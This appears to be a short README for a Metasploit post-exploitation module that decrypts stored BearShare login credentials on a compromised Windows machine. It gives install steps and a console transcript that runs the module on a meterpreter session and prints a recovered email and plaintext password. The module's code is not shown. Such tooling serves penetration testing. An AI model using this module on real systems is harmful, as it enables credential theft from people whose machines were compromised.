metasploit-bearshare-decrypt
=================

Version 1.0 - Feedback welcome <surefire@unallocatedspace.org>

bearshare_decrypt Metasploit module

To install, place in your ~/.msf4/modules/post/windows/gather folder, then:

```
meterpreter > background
[*] Backgrounding session 5...
msf  exploit(handler) > use post/windows/gather/bearshare_decrypt
msf  post(bearshare_decrypt) > set SESSION 5
SESSION => 5
msf  post(bearshare_decrypt) > show options

Module options (post/windows/gather/bearshare_decrypt):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  5                yes       The session to run this module on.

msf  post(bearshare_decrypt) > run

[+] Found oh_god_why@mailinator.com under SID S-1-5-21-484763869-436374069-1060284298-1003
[+] Username / Password : oh_god_why@mailinator.com / "password1"
[*] Post module execution completed
msf  post(bearshare_decrypt) > 


```
